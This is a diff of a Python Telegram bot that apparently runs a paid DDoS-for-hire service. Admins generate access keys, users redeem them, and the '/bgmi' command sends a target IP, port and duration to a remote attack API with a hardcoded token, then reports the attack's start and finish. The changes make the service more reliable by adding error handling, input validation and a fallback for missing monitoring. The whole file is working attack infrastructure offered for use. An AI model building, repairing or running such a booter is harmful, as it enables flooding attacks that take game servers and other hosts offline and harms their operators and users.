@@ -4,9 +4,16 @@ import requests
 import datetime
 import os
 import time
-import psutil # - Asali System Load ke liye
 import socket
 import threading
+
+# Try to import psutil (optional - if not available, status will show limited info)
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+    print("⚠️ psutil not available - status command will show limited info")
 
 # - Load Config (Admin ID aur Token)
 if os.path.exists('config.json'):
@@ -16,10 +23,17 @@ else:
     print("Error: config.json file nahi mili!")
     exit()
 
+# Create bot instance
 bot = telebot.TeleBot(config['token'])
-bot.remove_webhook()
-# NEW (use environment variable):
-# This tries environment variable first, then falls back to hardcoded URL
+
+# FIX 1: Remove webhook to avoid 409 conflict error
+try:
+    bot.remove_webhook()
+    print("✅ Webhook removed successfully")
+except Exception as e:
+    print(f"Webhook removal note: {e}")
+
+# FIX 2: Use environment variable for API URL (works on Render)
 API_URL = os.environ.get('API_URL', 'https://drx-api-x40n.onrender.com/hit')
 AUTH_TOKEN = "DRX_POWER_ULTRA_V4"
 
@@ -29,11 +43,13 @@ USERS_FILE = "users.json"
 
 def load_data(file):
     if os.path.exists(file):
-        with open(file, 'r') as f: return json.load(f)
+        with open(file, 'r') as f:
+            return json.load(f)
     return {}
 
 def save_data(file, data):
-    with open(file, 'w') as f: json.dump(data, f, indent=4)
+    with open(file, 'w') as f:
+        json.dump(data, f, indent=4)
 
 # - Commands Logic
 @bot.message_handler(commands=['start'])
@@ -60,7 +76,8 @@ def genkey(m):
         return bot.reply_to(m, "❌ Admin only command.")
     
     args = m.text.split()
-    if len(args) < 2: return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
+    if len(args) < 2:
+        return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")
     
     duration = args[1]
     key = "DRX-" + os.urandom(3).hex().upper()
@@ -74,7 +91,8 @@ def genkey(m):
 @bot.message_handler(commands=['redeem'])
 def redeem(m):
     args = m.text.split()
-    if len(args) < 2: return bot.reply_to(m, "Usage: /redeem DRX-XXXX")
+    if len(args) < 2:
+        return bot.reply_to(m, "Usage: /redeem DRX-XXXX")
     
     user_key = args[1]
     keys = load_data(KEYS_FILE)
@@ -92,9 +110,9 @@ def redeem(m):
     else:
         bot.reply_to(m, "❌ Invalid or Expired Key.")
 
+# FIX 3: Fixed attack command - properly checks JSON response for success
 @bot.message_handler(commands=['bgmi'])
 def attack(m):
-    # Sahi function name use kiya gaya hai
     users = load_data(USERS_FILE) 
     user_id = str(m.from_user.id)
     
@@ -107,21 +125,46 @@ def attack(m):
     
     ip, port, attack_time = args[1], args[2], args[3]
     
+    # Validate port and time are numbers
+    if not port.isdigit():
+        bot.reply_to(m, "❌ Port must be a number!")
+        return
+    if not attack_time.isdigit():
+        bot.reply_to(m, "❌ Time must be a number!")
+        return
+    
     try:
-        response = requests.get(f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}", timeout=10)
+        # Build the full URL
+        full_url = f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}"
+        print(f"Calling API: {full_url}")  # Debug log
         
+        response = requests.get(full_url, timeout=10)
+        print(f"Response: {response.status_code} - {response.text}")  # Debug log
+        
+        # FIX: Check if response contains "success" in the JSON
         if response.status_code == 200:
-            bot.reply_to(m, f"🚀 **ATTACK STARTED!**\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅")
-            
-            def send_finish():
-                bot.send_message(m.chat.id, f"✅ **ATTACK FINISHED**\n🎯 Target: `{ip}:{port}`\nStatus: Match Server Response Timed Out")
-            
-            threading.Timer(int(attack_time), send_finish).start()
+            try:
+                result = response.json()
+                if result.get('status') == 'success':
+                    bot.reply_to(m, f"🚀 **ATTACK STARTED!**\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅")
+                    
+                    def send_finish():
+                        bot.send_message(m.chat.id, f"✅ **ATTACK FINISHED**\n🎯 Target: `{ip}:{port}`\nStatus: Attack Completed")
+                    
+                    threading.Timer(int(attack_time), send_finish).start()
+                else:
+                    bot.reply_to(m, f"❌ **API ERROR!**\n{result.get('message', 'Unknown error')}")
+            except:
+                bot.reply_to(m, f"❌ **API ERROR!**\nInvalid response from API")
         else:
-            bot.reply_to(m, "❌ **API ERROR!**\nServer responded but with an error.")
+            bot.reply_to(m, f"❌ **API ERROR!**\nStatus Code: {response.status_code}")
             
+    except requests.exceptions.ConnectionError:
+        bot.reply_to(m, "❌ **API OFFLINE!**\nCould not connect to API. Check if API service is running.")
+    except requests.exceptions.Timeout:
+        bot.reply_to(m, "❌ **API TIMEOUT!**\nAPI did not respond in time.")
     except Exception as e:
-        bot.reply_to(m, "❌ **VPS OFFLINE!**\nCould not connect to API. `python3 api.py` start hai?")
+        bot.reply_to(m, f"❌ **ERROR!**\n{str(e)}")
 
 @bot.message_handler(commands=['myinfo'])
 def myinfo(m):
@@ -132,32 +175,44 @@ def myinfo(m):
     else:
         bot.reply_to(m, "❌ No active plan found.")
 
+# FIX 4: Fixed status command - works even without psutil
 @bot.message_handler(commands=['status'])
 def status(m):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(2)
+    # Check API status using HTTP request
+    api_status = "Unknown 🔴"
     try:
-        # Localhost check ke liye 127.0.0.1 sahi hai
-        s.connect(('127.0.0.1', 8080))
-        api_status = "Online 🟢"
-        s.close()
+        # Get base URL (remove /hit)
+        api_base = API_URL.replace('/hit', '')
+        response = requests.get(api_base, timeout=5)
+        if response.status_code == 200:
+            api_status = "Online 🟢"
+        else:
+            api_status = f"Error {response.status_code} 🟡"
     except:
         api_status = "Offline 🔴"
-
-    cpu_usage = psutil.cpu_percent(interval=1)
-    ram_usage = psutil.virtual_memory().percent
-    load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
+    
+    # CPU/RAM info (only if psutil available)
+    if PSUTIL_AVAILABLE:
+        cpu_usage = psutil.cpu_percent(interval=1)
+        ram_usage = psutil.virtual_memory().percent
+        load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
+        cpu_text = f"{cpu_usage}% {load_icon}"
+        ram_text = f"{ram_usage}% 🟢"
+    else:
+        cpu_text = "N/A"
+        ram_text = "N/A"
     
     status_text = (
         "📊 **DRX POWER LIVE STATUS**\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"🤖 **Bot Status:** Active ✅\n"
         f"🔌 **API Connection:** {api_status}\n"
-        f"🖥️ **CPU Load:** {cpu_usage}% {load_icon}\n"
-        f"💾 **RAM Usage:** {ram_usage}% 🟢\n"
-        f"🚀 **VPS Power:** 32GB OPTIMIZED\n"
+        f"🖥️ **CPU Load:** {cpu_text}\n"
+        f"💾 **RAM Usage:** {ram_text}\n"
+        f"🚀 **Platform:** Render.com\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
     bot.reply_to(m, status_text, parse_mode="Markdown")
 
-bot.polling(none_stop=True)
+print("🤖 DRX Bot is running and waiting for commands...")
+bot.polling(none_stop=True, interval=0, timeout=20)
